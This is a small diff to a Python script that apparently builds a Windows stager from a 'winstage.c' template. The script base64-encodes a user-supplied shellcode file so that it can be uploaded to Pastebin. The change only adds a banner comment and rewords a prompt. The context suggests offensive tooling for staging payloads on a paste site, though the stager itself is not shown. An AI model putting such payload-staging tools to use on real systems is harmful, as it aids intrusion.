@@ -37,6 +37,8 @@ def getFileName(prompt):
         except IOError:
             print("That file doesn't seem to exist. Try again.")
 
+###### BEGIN SCRIPT ######
+
 basePath = os.path.dirname(os.path.abspath(__file__))
 
 with open('winstage.c', 'rb') as f:
@@ -44,7 +46,7 @@ with open('winstage.c', 'rb') as f:
 
 template = Template(rawCode)
 
-script = getFileName("Please enter the filename of an shell script you would like to upload to Pastebin for future use (the file should be in this directory): ")
+script = getFileName("Please enter the filename of the shellcode you would like to upload to Pastebin for future use (the file should be in this directory): ")
 with open(script, 'rb') as f:
     upload = f.read()
     coded = base64.b64encode(upload)
